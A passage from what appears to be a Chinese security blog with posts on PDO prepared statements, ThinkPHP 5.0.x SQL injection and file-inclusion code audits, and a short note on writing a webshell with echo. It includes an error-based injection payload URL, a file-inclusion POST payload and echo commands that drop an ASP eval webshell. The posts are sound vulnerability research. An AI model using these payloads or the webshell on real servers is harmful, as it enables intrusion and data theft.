        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>昨天碰到PDO预编译造成无法sql注入的情况,不是很清楚PDO的处理机制,自己去网上差了些资料,记录一波。</p>
</blockquote>
<hr>
<p><strong>定义：</strong></p>
<blockquote>
<p>在生成网页时，许多PHP脚本通常都会执行除参数之外，其他部分完全相同的查询语句，针对这种重复执行一个查询，每次迭代使用不同的参数情况，PDO提供了一种名为预处理语句(prepared statement)的机制。它可以将整个SQL命令向数据库服务器发送一次，以后只有参数发生变化，数据库服务器只需对命令的结构做一次分析就够了，即编译一次，可以多次执行。</p>
</blockquote>
<p><strong>准备语句:</strong><br>重复执行一个SQL查询，通过每次迭代使用不同的参数,在PDO中有两种使用占位符的语法：“命令参数”和“问号参数”<br>A.使用命名参数作为占位符:</p>
<pre><code>$link = $dbh-&gt;prepare(&quot;INSERT INTO contactInto(name,address,phone)VALUES (:name,:address,:phone)&quot;);
</code></pre><p>B.使用?作为占位符:</p>
<pre><code>$link = $dbh-&gt;prepare(&quot;INSERT INTO contactInfo(name,address,phone) VALUES (?,?,?)&quot;);
</code></pre><p>不管是否使用了占位符,都需要使用PDO对象中的prepare()方法，去准备这个将要用于迭代执行的查询，并返回一个PDOStatement类对象</p>
<p><strong>绑定参数:</strong><br>A.当sql语句在数据库服务端准备好了一个”sql”语句后,如果使用了占位符,就需要在每次执行时替换输入的参数,可通过PDOStatement对象中的bindParam()或者bindValue()方法,把参数变量绑定到准备好的占位符上<br>    <strong>bindParam()</strong>:<br>    分别绑定上对应的参数</p>
<pre><code>$link-&gt;bindParam(&quot;:name&quot;,$name);//使用命名参数绑定参数的情况
$link-&gt;bindParam(&quot;1&quot;,$name);//使用?绑定参数的情况
</code></pre><p>B.区别:<br>   bindParam()只有在PDOStatement::execute()被调用的时候才取其值<br>C.实例:</p>
<pre><code>$id = 1;
$st-&gt;bindParam(1,$id,PDO::PARAM_INT);
$id = 2;    
$st-&gt;execute();
</code></pre><p>使用bindParam()取得是id=2的值 而bindValue()取得是id=1的值</p>
<p><strong>执行查询:</strong><br>通过调用PDOStatement类对象中的execute()方法去反复执行在数据库缓存区准备好的语句</p>
<pre><code>$st-&gt;execute();
</code></pre><p><strong>PDO防止sql注入：</strong></p>
<ol>
<li>需要设置<code>$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false)</code></li>
</ol>
<blockquote>
<p>PDO几乎为所支持的所有数据库提供了命令占位符模拟,甚至可以为生来就不支持该概念的数据库模拟预处理语句和绑定参数。如果说开启了模拟预处理(即参数值为true),那么PDO内部会模拟参数绑定的过程,SQL语句是在最后execute()的时候才发送给数据库执行；如果我这里设置了PDO::ATTR_EMULATE_PREPARES =&gt; false，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的,来阻止sql注入</p>
</blockquote>
<p>2.我们解释下两种交互过程:<br>A.模拟预处理:<br>客户端本地执行预处理的模拟，最终将拼好的sql语句发送到mysql服务器进行执行<br>B.本地预处理:<br>分两步进行:<br>a.prepare()阶段:发送带有占位符的sql语句到mysql服务器(parsing-&gt;resolution)<br>b.多次发送占位符参数给mysql服务器进行执行(多次执行optimization-&gt;execution)</p>
<p>3.如出现sql语句错误: 使用本地预处理：是在prepare()阶段就会检测出sql语句的错误   使用模拟预处理: 只有在exec阶段才能发现(拼接好sql语句 在exec阶段才会发送给mysql服务器)</p>
<p>本地预处理:</p>
<pre><code>    &lt;?php
$params = [
    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,//开启错误模式
    PDO::ATTR_EMULATE_PREPARES  =&gt; false,
];

$db = new PDO(&apos;mysql:dbname=tp;host=127.0.0.1;&apos;, &apos;root&apos;, &apos;root&apos;, $params);

try {
    $link = $db-&gt;prepare(&apos;SELECT * FROM user WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&apos;);
} catch (\PDOException $e) {
    var_dump($e);//打印错误信息
}
</code></pre><p>虽然只执行了prepare()函数 但是sql语句也成功报错<br><img src="http://static.zybuluo.com/chhyx/0jgrbzassu76coiknqux219a/image_1cnqcbjn9h7u9h91bkp1phs1j1u9.png" alt="image_1cnqcbjn9h7u9h91bkp1phs1j1u9.png-47.4kB"></p>
<p>模拟预处理:<br>未报错:<br><img src="http://static.zybuluo.com/chhyx/784qcml72336xbr671u6xwtz/image_1cnqcovr0uii7l911241f0k1cr97f.png" alt="image_1cnqcovr0uii7l911241f0k1cr97f.png-53.2kB"></p>
<p>执行execute()报错:<br><img src="http://static.zybuluo.com/chhyx/jma77nhme7l2ndljbgfx1g8l/image_1cnqcqs5a5pq48n1a25tm718ec7v.png" alt="image_1cnqcqs5a5pq48n1a25tm718ec7v.png-84.5kB"></p>
<p><strong>参考链接:</strong><br>1.<a href="https://www.cnblogs.com/alazalazalaz/p/6056393.html" target="_blank" rel="noopener">https://www.cnblogs.com/alazalazalaz/p/6056393.html</a><br>2.<a href="https://www.cnblogs.com/tinywan/p/6143889.html" target="_blank" rel="noopener">https://www.cnblogs.com/tinywan/p/6143889.html</a><br>3.<a href="https://blog.csdn.net/a7442358/article/details/45268489" target="_blank" rel="noopener">https://blog.csdn.net/a7442358/article/details/45268489</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入/" itemprop="url">代码审计 | ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-19T08:15:41+08:00">
                2018-09-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p><strong>1.基础知识</strong><br>A.Thinkphp的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/42wg1fal3zdlypt0yqnx10qj/image_1cnoln6a46g715koj3o6rcpbhm.png" alt="image_1cnoln6a46g715koj3o6rcpbhm.png-71.9kB"><br>更多基础知识可参考文章：<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/</a><br><strong>2.环境搭建</strong><br>A.</p>
<pre><code>#application\index\controller\Index.php
&lt;?php
namespace app\index\controller;
use app\model\Gather;
use think\Db;

class Index
{    
    public function test()
    {
        $ids = input(&quot;id/a&quot;);
        $gather = new Gather();
        $gather-&gt;update([&apos;gather_waf&apos; =&gt; &apos;thinkphp&apos;],[&apos;id&apos; =&gt; [&apos;in&apos;,$ids]]);
    }
}
?&gt;
</code></pre><p>B.</p>
<pre><code>#application\model\Gather.php
&lt;?php
namespace app\model;
use think\Model;
use think\Db;

class Gather extends Model {
    public function getModel(){
        $rs = Db::query(&apos;show columns FROM user&apos;);
        $a = [];
        if($rs){
            foreach ($rs as $key =&gt; $v) {
                $a[$v[&apos;Field&apos;]] = $v[&apos;Default&apos;];
                if($v[&apos;key&apos;] == &apos;PRI&apos;){
                    $v[&apos;Field&apos;] = 0;
                }    
            }
    }    return $a;        
    }
}    

?&gt;
</code></pre><p>C.<br> 数据库下新建表gather表下新建字段gather_waf、id</p>
<p><strong>3.漏洞利用</strong><br>payload：<br><code>127.0.0.1:82/public/index.php/index/index/test?id[0,updatexml(0,concat(0xa,user()),0)]=1</code></p>
<p><img src="http://static.zybuluo.com/chhyx/0zcysigiatdabqegxix5iwhj/image_1cnoariv0mgh17d11mfk1k52t0036.png" alt="image_1cnoariv0mgh17d11mfk1k52t0036.png-64.9kB"></p>
<p><strong>4.代码审计</strong><br>相关变量已经在注释中<br>A.从index.php开始，</p>
<pre><code>$gather-&gt;update([&apos;gather_waf&apos; =&gt; &apos;thinkphp&apos;],[&apos;id&apos; =&gt; [&apos;in&apos;,$ids]]);
</code></pre><p>B.跟进model.php的update()方法:<br>1448行:</p>
<pre><code>#thinkphp\library\think\Model.php
$result = $model-&gt;isUpdate(true)-&gt;save($data, $where);
</code></pre><p>跟进save()方法<br>1002行:</p>
<pre><code>#thinkphp\library\think\Model.php
public function save($data = [], $where = [], $sequence = null)
{
    if (!empty($data)) {
        // 数据自动验证
        if (!$this-&gt;validateData($data)) {
            return false;
        }
        // 数据对象赋值
        foreach ($data as $key =&gt; $value) {
            $this-&gt;setAttr($key, $value, $data);
        }
    }
    ...
    $pk = $this-&gt;getPk();//$pk:NULL
    if ($this-&gt;isUpdate) {//$this-&gt;isUpdate:true
    ...
        // 模型更新
        //$this-&gt;getQuery()://think\db\Query::$where
        $result =                
        $this-&gt;getQuery()-&gt;where($where)-&gt;update($data);

        ...
}
</code></pre><p>其中:            </p>
<pre><code>$result = $this-&gt;getQuery()-&gt;where($where)-&gt;update($data);
</code></pre><p>C.跟进query.php的update()方法</p>
<pre><code>#thinkphp\library\think\db\Query.php
public function update(array $data = [])
{   
    ...
    //where不为空
    ...
    // 生成UPDATE SQL语句
    $sql = $this-&gt;builder-&gt;update($data, $options);
    // 获取参数绑定
    $bind = $this-&gt;getBind();
    ... 
    else {
        // 检测缓存
        if (isset($key) &amp;&amp; Cache::get($key)) {
            // 删除缓存
            Cache::rm($key);
        } elseif (!empty($options[&apos;cache&apos;][&apos;tag&apos;])) {
            Cache::clear($options[&apos;cache&apos;][&apos;tag&apos;]);
        }
        // 执行操作
        //$sql:UPDATE `gather` SET `gather_waf`=:__data__gather_waf WHERE `id` IN (:where_id_in_00000&apos;)
        $result = &apos;&apos; == $sql ? 0 : $this-&gt;execute($sql, $bind);

        ...
        return $result;
    }
}
</code></pre><p>其中:</p>
<pre><code>$sql = $this-&gt;builder-&gt;update($data, $options);
</code></pre><p>D.跟进<code>thinkphp\library\think\db\Builder.php</code>的<code>update()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/u6zwd3bbanwd7vefq952id1a/image_1cno7um1g11q71p2213001b9psbf1p.png" alt="image_1cno7um1g11q71p2213001b9psbf1p.png-71.8kB"><br>其中:</p>
<pre><code>$this-&gt;parseWhere($options[&apos;where&apos;], $options),
</code></pre><p>跟进<code>parseWhere()</code>方法:</p>
<pre><code>#thinkphp\library\think\db\Builder.php
protected function parseWhere($where, $options)
{   
    $whereStr = $this-&gt;buildWhere($where, $options);
    //$whereStr:`id` IN (:where_id_in_00000&apos;)
    ...
    return empty($whereStr) ? &apos;&apos; : &apos; WHERE &apos; . $whereStr;

}
</code></pre><p>其中:</p>
<pre><code>$whereStr = $this-&gt;buildWhere($where, $options);
</code></pre><p>跟进<code>buildWhere()</code>方法:</p>
<pre><code>public function buildWhere($where, $options)
{   
    ...

    $whereStr = &apos;&apos;;
    //$options[&apos;table&apos;]:gather
    $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
    foreach ($where as $key =&gt; $val) {
        $str = [];
        foreach ($val as $field =&gt; $value) {
            ....
            else {
                // 对字段使用表达式查询
                $field = is_string($field) ? $field : &apos;&apos;;
                $str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);
            }
        }
        $whereStr .= empty($whereStr) ? substr(implode(&apos; &apos;, $str), strlen($key) + 1) : implode(&apos; &apos;, $str);
    }

    return $whereStr;
}
</code></pre><p>其中:</p>
<pre><code>$str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);
</code></pre><p>跟进<code>parseWhereItem()</code>方法:</p>
<pre><code>protected function parseWhereItem($field, $val, $rule = &apos;&apos;, $options = [], $binds = [], $bindName = null)
{   
    //$field:id   $val:[0=&gt;&apos;in&apos;,1=&gt;{[&quot;00000&apos;&quot;]=&gt; &quot;1&apos;&quot;}]
    $key = $field ? $this-&gt;parseKey($field, $options) : &apos;&apos;;
    //$key:`id`

    ...

    list($exp, $value) = $val;
    //$exp:in   $value: [&quot;00000&apos;&quot;]=&gt; &quot;1&apos;&quot;

    ...

    // 检测操作符
    if (!in_array($exp, $this-&gt;exp)) {//进入
        $exp = strtolower($exp);
        if (isset($this-&gt;exp[$exp])) {
            $exp = $this-&gt;exp[$exp];//$exp:IN
        } else {
            throw new Exception(&apos;where express error:&apos; . $exp);
        }
    }
    ...
    $whereStr = &apos;&apos;;
    ...
</code></pre><p>这里得到的<code>$exp</code>的值为<code>IN</code>,我们看下与in有关的操作代码:</p>
<pre><code>if (preg_match(&apos;/\W/&apos;, $bindName)) {
// 处理带非单词字符的字段名
$bindName = md5($bindName);
}
...
elseif (in_array($exp, [&apos;NOT IN&apos;, &apos;IN&apos;])) {//进入
   // IN 查询
   if ($value instanceof \Closure) {
       $whereStr .= $key . &apos; &apos; . $exp . &apos; &apos; . $this-&gt;parseClosure($value);
   } else {//进入
       $value = is_array($value) ? $value : explode(&apos;,&apos;, $value);
       if (array_key_exists($field, $binds)) {
           $bind  = [];
           $array = [];
           //$value:[&quot;00000&apos;&quot;]=&gt; &quot;1&apos;&quot;
           foreach ($value as $k =&gt; $v) {
               if ($this-&gt;query-&gt;isBind($bindName . &apos;_in_&apos; . $k)) {//判断这个bindname不存在
                   $bindKey = $bindName . &apos;_in_&apos; . uniqid() . &apos;_&apos; . $k;
               } else {//进入
                   $bindKey = $bindName . &apos;_in_&apos; . $k;
               }
               $bind[$bindKey] = [$v, $bindType];
               $array[]        = &apos;:&apos; . $bindKey;
           }
           //$bind:[&quot;where_id_in_00000&apos;&quot;]=&gt;{ [0]=&gt; &quot;1&apos;&quot; [1]=&gt; int(2) } 
           $this-&gt;query-&gt;bind($bind);
           $zone = implode(&apos;,&apos;, $array);
       } else {
           $zone = implode(&apos;,&apos;, $this-&gt;parseValue($value, $field));
       }
       $whereStr .= $key . &apos; &apos; . $exp . &apos; (&apos; . (empty($zone) ? &quot;&apos;&apos;&quot; : $zone) . &apos;)&apos;;
       //$whereStr：`id` IN (:where_id_in_00000&apos;)
   }
        }
</code></pre><p>E.这里就是形成漏洞的<strong>关键</strong>处:虽然<code>$bindName</code>在进入绑定操作前进行了<code>preg_match()</code>检测,但是在<code>$value</code>为数组的情况下程序就会遍历数组<code>$value</code>并将键组<code>$k</code>直接拼接到<code>$bindName</code>,而<code>$k</code>并没有进行安全处理,所以导致了在预编译的时候SQL异常,tp框架在5.0.9又默认开启debug调试模式 所以爆出数据库连接账户和密码</p>
<p>这里我们理一下文件及跟进的函数</p>
<pre><code>Model.php(update)--&gt;Model.php(save)---&gt;query.php(update)--&gt;Builder.php(update)--&gt;Builder.php(parseWhere)--&gt;Builder.php(buildWhere)--&gt;Builder.php(parseWhereItem)  得到$sql语句
</code></pre><p>然后sql语句回溯<br><code>Builder.php(buildWhere)--&gt;Builder.php(parseWhere)--&gt;Builder.php(update)--query.php(update)</code></p>
<p>在quert.php的update()方法,执行execute时报错</p>
<pre><code>$result = &apos;&apos; == $sql ? 0 : $this-&gt;execute($sql, $bind);
</code></pre><p>我们跟进execute()方法看一下:</p>
<pre><code>#thinkphp\library\think\db\Connection.php
...
if (empty($this-&gt;PDOStatement)) {
$this-&gt;PDOStatement = $this-&gt;linkID-&gt;prepare($sql);
</code></pre><p>经过上下文的<code>die()</code>测试,发现程序是在用<code>prepare()</code>编译时报错</p>
<p>F.按照文章中笔者的说法,这里并不存在sql注入,但是经过查阅相关资料及P师傅的博客,发现这里其实是一个不允许子查询的sql注入</p>
<p><strong>鸡肋sql注入:</strong><br>在上面的分析中 我们知道<code>$k</code>也就是<code>$bindName</code>是我们可以控制的,说明我们可控制预编译的sql语句,但是这里为什么说是一个不允许子查询的sql注入呢。<br>这里涉及到PDO预编译的三个步骤:</p>
<pre><code>1.prepare($sql)    编译SQL语句
2.bindParam($a,$b)  绑定 PHP 变量到参数标记
3.execute()    执行sql语句
</code></pre><p>这里也涉及到一个<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>预处理参数的配置<br>直接引用P师傅的话:</p>
<blockquote>
<p>这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行；如果我这里设置了PDO::ATTR_EMULATE_PREPARES<br>=&gt; false，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。</p>
<p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p>
</blockquote>
<p>默认的Thinkphp配置：<br><img src="http://static.zybuluo.com/chhyx/g0wkga74rhoc97bjywwbbe38/image_1cnol50m31iepu3usdb8epq99.png" alt="image_1cnol50m31iepu3usdb8epq99.png-21.5kB"></p>
<p>那么,假设在第一步执行prepare($SQL)的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步，这就是执行我们sql语句的关键<br>访问:</p>
<pre><code>127.0.0.1:82/public/index.php/index/index/test?id[0,updatexml(0,concat(0xa,user()),0)]=1
</code></pre><p>即可成功获得user()信息:<br><img src="http://static.zybuluo.com/chhyx/0zcysigiatdabqegxix5iwhj/image_1cnoariv0mgh17d11mfk1k52t0036.png" alt="image_1cnoariv0mgh17d11mfk1k52t0036.png-64.9kB"></p>
<p>但是id数组的键并不能为子查询语句 只能用一些数据库函数来注入,由于笔者并不擅长sql注入,等有时间回来再试试。<br><strong>5.参考链接</strong><br>1.<a href="http://www.runoob.com/php/pdo-prepare.html" target="_blank" rel="noopener">http://www.runoob.com/php/pdo-prepare.html</a><br>2.<a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener">https://xz.aliyun.com/t/125</a><br>3.<a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a><br>4.<a href="https://www.kancloud.cn/manual/thinkphp5/135187" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/135187</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/18/echo写马技巧/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/18/echo写马技巧/" itemprop="url">echo写马技巧</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-18T08:15:41+08:00">
                2018-09-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>win下与Linux写马方式不同 记录一下</p>
</blockquote>
<hr>
<p><strong>1.windows环境：</strong></p>
<p>错误姿势:</p>
<pre><code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; c:\test\test.asp
</code></pre><p><img src="http://static.zybuluo.com/chhyx/3c1ubw1t3pztnb0ti98k4ppi/image_1cnlvn0if65u1ej713rtjrc1jv19.png" alt="image_1cnlvn0if65u1ej713rtjrc1jv19.png-6.8kB"></p>
<p>我们可以看到我们的代码加了引号 导致无法执行</p>
<p>正确姿势:</p>
<pre><code>echo ^&lt;%eval request(cmd)%^&gt; &gt; c:\test\cmd.asp
</code></pre><p><img src="http://static.zybuluo.com/chhyx/nd2sueikbr59v1ri2sdev74q/image_1cnlvt3ufjbonoe1gaj91u1eujm.png" alt="image_1cnlvt3ufjbonoe1gaj91u1eujm.png-9.8kB"></p>
<p><strong>2.Linux环境：</strong><br>linux下正确写马:<code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; test.asp</code><br><img src="http://static.zybuluo.com/chhyx/fx68wthg11dls5bmxemtinjy/image_1cnm0h7smciu1gel1muegi4150u1j.png" alt="image_1cnm0h7smciu1gel1muegi4150u1j.png-61.1kB"></p>
<p><strong>参考链接:</strong><br><a href="https://mochazz.github.io/2017/08/26/echo/" target="_blank" rel="noopener">https://mochazz.github.io/2017/08/26/echo/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/17/ThinkPHP3.x5.x框架任意文件包含/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/17/ThinkPHP3.x5.x框架任意文件包含/" itemprop="url">代码审计 | ThinkPHP3.x/5.x框架任意文件包含</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-17T10:15:41+08:00">
                2018-09-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>最近学习thinkphp框架审计 网上找了几个例子去复现,看到关于这个漏洞的文章不是很多,所以在大佬的payload的基础上自己试着审计了一波,记录一下。</p>
</blockquote>
<hr>
<p>审计cms：<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">Thinkphp 5.0.10</a><br>漏洞原理:</p>
<pre><code>ThinkPHP在加载模版解析变量时存在变量覆盖的问题，且没有对 $cacheFile 进行相应的消毒处理，导致模板文件的路径可以被覆盖，从而导致任意文件包含漏洞的发生。
</code></pre><p>##<strong>1.基础知识:</strong><br>Thinkphp的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/g7pjo7e4gk3hshv17d0equzb/image.png" alt="image.png-73.6kB"></p>
<p>其他基础知识可参考文章:<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/</a></p>
<p>##<strong>2.环境搭建:</strong><br>A.</p>
<pre><code>#thinkphp5_0_10\application\index\controller\Index.php
&lt;?php
namespace app\index\controller;
class Index extends \think\Controller 
{
    public function index()
    {
        $this-&gt;assign($this-&gt;request-&gt;post());
        return $this-&gt;fetch();

        }
}
</code></pre><p>B.在thinkphp5_0_10\application\index\view\index目录下新建一个index.html，内容随意填写</p>
<p>C.因为测试漏洞为文件包含 所以在根目录新建一个1.txt当测试用(其他格式也可以 内容<code>&lt;?php phpinfo();?&gt;)</code></p>
<p>##<strong>3.漏洞利用:</strong><br>payload:</p>
<pre><code>post:cacheFile=../1.txt
</code></pre><p><img src="http://static.zybuluo.com/chhyx/068ucjph0k3tr314ximxszv2/image.png" alt="image.png-34kB"></p>
<p>##<strong>4.代码分析:</strong><br><strong>其相关变量的值已加在注释中:</strong><br>A.从index.php开始分析:</p>
<pre><code>$this-&gt;assign($this-&gt;request-&gt;post());
</code></pre><p>进入thinkphp5_0_10\thinkphp\library\think\Controller.php</p>
<p><img src="http://static.zybuluo.com/chhyx/d3vvbqzjlw3m0h33qojuykrj/image.png" alt="image.png-13.3kB"></p>
<p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code></p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php 92行
public function assign($name, $value = &apos;&apos;)
{      
    if (is_array($name)) {//$name:[&quot;cacheFile&quot;]=&gt;&quot;../1.txt&quot;
        //$this-&gt;data:空字符  把$name赋值给$this-&gt;data
        $this-&gt;data = array_merge($this-&gt;data, $name);
    } else {
        $this-&gt;data[$name] = $value;
    }
    return $this;
}
</code></pre><p>传进去的变量<code>cacheFile</code>成功存储,我们打印下<code>$this</code>:<br><img src="http://static.zybuluo.com/chhyx/8f08wcjbsngdwizmbb7xudjj/image.png" alt="image.png-112.8kB"></p>
<p>B.返回index.php继续分析:</p>
<pre><code>return $this-&gt;fetch();
</code></pre><p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code><br><img src="http://static.zybuluo.com/chhyx/17x7tdldon5dbxedadlkq2vl/image.png" alt="image.png-13.8kB"></p>
<p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code></p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php   149行
public function fetch($template = &apos;&apos;, $vars = [], $replace = [], $config = [], $renderContent = false)
    {
        // 模板变量
        //self::$var:空  $vars:空
        $vars = array_merge(self::$var, $this-&gt;data, $vars);

        // 页面缓存
        ob_start();
        ob_implicit_flush(0);

        // 渲染输出
        $method = $renderContent ? &apos;display&apos; : &apos;fetch&apos;;//$renderContent=false所以$method=fetch
        $this-&gt;engine-&gt;$method($template, $vars, $config);//$this-&gt;engine-&gt;$fetch

        // 获取并清空缓存

        $content = ob_get_clean();
        // 内容过滤标签
        Hook::listen(&apos;view_filter&apos;, $content);
        // 允许用户自定义模板的字符串替换
        $replace = array_merge($this-&gt;replace, $replace);
        if (!empty($replace)) {
            $content = strtr($content, $replace);
        }

        return $content;
    }
</code></pre><p>在上面的<code>$this-&gt;engine-&gt;$method($template, $vars, $config);</code> 这里的$method是fetch<br>跟进本文件的<code>engine()</code>方法:</p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php   109行
public function engine($options = [])
 {   
     if (is_string($options)) {
         $type    = $options;
         $options = [];
     } else {
         $type = !empty($options[&apos;type&apos;]) ? $options[&apos;type&apos;] : &apos;Think&apos;;//$type:Think
     }
     $class = false !== strpos($type, &apos;\\&apos;) ? $type : &apos;\\think\\view\\driver\\&apos; . ucfirst($type);
     //$class:\think\view\driver\Think
     if (isset($options[&apos;type&apos;])) {
         unset($options[&apos;type&apos;]);
     }
     $this-&gt;engine = new $class($options);
     return $this;
 }
</code></pre><p>在上面的<code>$this-&gt;engine = new $class($options);</code>初始化了一个类 我们打印下这个类:<br><img src="http://static.zybuluo.com/chhyx/3m78ae1hfa152s73s73of0xc/image.png" alt="image.png-72.3kB"></p>
<p>C.跟进<code>thinkphp\library\think\view\driver\Think.php</code> </p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\view\driver\Think.php  72行:
public function fetch($template, $data = [], $config = [])
{   
    if (&apos;&apos; == pathinfo($template, PATHINFO_EXTENSION)) {
        // 获取模板文件名
        $template = $this-&gt;parseTemplate($template);
        //$template:application/index\view\index\index.html
    }
    // 模板不存在 抛出异常
    if (!is_file($template)) {
        throw new TemplateNotFoundException(&apos;template not exists:&apos; . $template, $template);
    }
    // 记录视图信息
    App::$debug &amp;&amp; Log::record(&apos;[ VIEW ] &apos; . $template . &apos; [ &apos; . var_export(array_keys($data), true) . &apos; ]&apos;, &apos;info&apos;);
    $this-&gt;template-&gt;fetch($template, $data, $config);
}
</code></pre><p>在上面的<code>$this-&gt;template-&gt;fetch($template, $data, $config);</code>,我们跟进<code>thinkphp\library\think\Template.php</code></p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\Template.php  168行
public function fetch($template, $vars = [], $config = [])
    {   
        //$template:application/index\view\index\index.html
        //$vars:{ [&quot;cacheFile&quot;]=&gt; string(8) &quot;../1.txt&quot; } 
        if ($vars) {
            $this-&gt;data = $vars;
        }
        if ($config) {
            $this-&gt;config($config);
        }
        ...
        $template = $this-&gt;parseTemplateFile($template);
